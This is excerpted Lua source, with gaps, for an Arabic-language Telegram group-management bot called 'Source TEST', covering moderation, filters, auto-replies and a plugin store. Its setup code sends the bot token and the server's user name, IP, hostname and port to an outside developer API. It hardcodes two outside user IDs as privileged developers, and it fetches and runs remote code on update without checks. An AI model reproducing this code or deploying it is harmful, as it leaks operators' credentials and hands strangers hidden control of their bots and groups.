...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
data,res = https.request("https://api-TEST.tk/api-s00f4/TEST.php?bn=TEST&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-TEST.tk/api-s00f4/TEST.php?n=TEST&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua TEST.lua')
end 
end
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-TEST/Files_TEST/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1891597035,1052711356}   
...
if tonumber(user_id) == tonumber(1891597035) then  
var = true  
elseif tonumber(user_id) == tonumber(1052711356) then
var = true  
...
elseif tonumber(user_id) == tonumber(1052711356) then
var = 'مبرمـج دراكـون'
elseif tonumber(user_id) == tonumber(1646852401) then
var = 'تاجهن'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
...
local UserName = (data.username_ or "XB_35 ")
...
TEST_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
TEST_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
TEST_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
TEST_Msg = 'امبروطور التفاعل' 
...
--------------------------------------------------------------------------------------------------------------
function SourceTEST(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,TEST_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf TEST.lua')
os.execute('wget https://raw.githubusercontent.com/SRC-TEST/TEST/main/TEST.lua')
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس تيست\n ℘︙ الاصدار » { v 1.6 }')
dofile('TEST.lua')  
end
if text == 'الاصدار ℘' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس تيست \n ℘︙ الاصدار »{ v 1.6 }')
end
...
send(msg.chat_id_, msg.id_,'℘︙  عدد الكروبات الان » { '..#group..' }'..TESTk..''..TEST..'\n℘︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ℘︙ العضو » ['..result.title_..'](t.me/'..(username or 'XB_35 ')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
usertext = '\n ℘︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'XB_35 ')..')'
status  = '\n ℘︙ تم ترقيته مطور'
...
local TEST1_Msg = database:get(bot_id.."TEST1:Add:Filter:Rp2"..text..msg.chat_id_)   
if TEST1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'XB_35 ')..') \n ℘︙ '..TEST1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if TEST_Msg and not Special(msg) then  
local TEST_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if TEST_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..TEST_Msg.."] \n")
else
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/XB_35 )}\n ℘︙ ["..TEST_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](T.ME/XB_35 )}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."TEST:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."TEST:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."TEST:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."TEST:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."TEST:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."TEST:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."TEST:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."TEST:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."TEST:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."TEST:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."TEST:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."TEST:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."TEST:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "XB_35 ")..")\n℘︙ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."TEST:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local TESTChengName = database:get(bot_id.."TEST:Cheng:Name"..data.id_)
if not data.first_name_ then 
if TESTChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..TESTChengName..']')
database:del(bot_id.."TEST:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if TESTChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."TEST:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local TESTChengUserName = database:get(bot_id.."TEST:Cheng:UserName"..data.id_)
if not data.username_ then 
if TESTChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..TESTChengUserName..']')
database:del(bot_id.."TEST:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if TESTChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."TEST:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local TESTChengPhoto = database:get(bot_id.."TEST:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if TESTChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."TEST:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if TESTChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."TEST:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
℘ ⦑ SOURCE TEST ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/XB_35 )
℘︙ [Source Update ](t.me/FIDRG)     
℘︙ [Source developer](t.me/s00f4)     
℘︙ [TEST programmer](t.me/mndzr) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS TEST](t.me/XB_35 bot)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'XB_35 ')..') \n ℘︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ℘︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'XB_35 ')..') \n ℘︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-TEST/Files_TEST/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات تيست\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس تيست ↓\n".." ℘︙ [اضغط هنا لدخول](t.me/XB_35 ) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-TEST/Files_TEST/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('TEST.lua')  
else
send(msg.chat_id_, msg.id_," ℘︙ عذرا الملف لايدعم سورس تيست \n") 
end
return false
end
...
local UserName = (b.username_ or "SRC-TEST")
...
function Function_TEST(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_TEST, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_TEST, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ℘︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'XB_35 ')..')'
status  = '\n ℘︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ℘︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ℘︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'XB_35 ')..')'
...
database:set(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ℘︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."TEST1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."TEST1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ℘︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."TEST1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."TEST1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."TEST1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ℘︙ ارسل الكلمه الان")  
database:set(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."TEST1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."TEST1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."TEST1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."TEST1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."TEST1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."TEST1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ℘︙ قائمة المنع \nٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do  
local TEST_Msg = database:get(bot_id.."TEST1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..TEST_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ℘︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'XB_35 ')..')'..'\n ℘︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'تيست').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'تيست')
local TEST_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..TEST_Msg[math.random(#TEST_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ℘︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:TEST:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:TEST:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:TEST:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:TEST:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:TEST:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:TEST:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:TEST:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:TEST:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:TEST:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:TEST:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:TEST:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:TEST:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:TEST:List:Rd:Sudo")
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/XB_35 "}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."XB_35 :insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."XB_35 :insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."XB_35 :insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."XB_35 :Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."XB_35 :Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."XB_35 :Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس تيست يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:TEST:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:TEST:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:TEST:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:TEST:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:TEST:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:TEST:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:TEST:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:TEST:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:TEST:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:TEST:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:TEST:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'تيست').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'XB_35 ')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
TESTdx(msg.chat_id_, msg.id_, ' ℘︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ℘︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ℘︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ℘︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/XB_35 "},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ TES ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽. ](t.me/XB_35 )➤ ')
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'تيست')
...
TEST = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(TEST)
...
--------------------------------------------------------------------------------------------------------------
SourceTEST(data.message_,data)
plugin_TEST(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local TESTAbot = database:get(bot_id.."TEST1:Add:Filter:Rp2"..text..result.chat_id_)   
if TESTAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..TESTAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local TEST1_Msg = database:get(bot_id.."TEST1:Add:Filter:Rp2"..text..result.chat_id_)   
if TEST1_Msg then    
send(msg.chat_id_, msg.id_," ℘︙ "..TEST1_Msg)
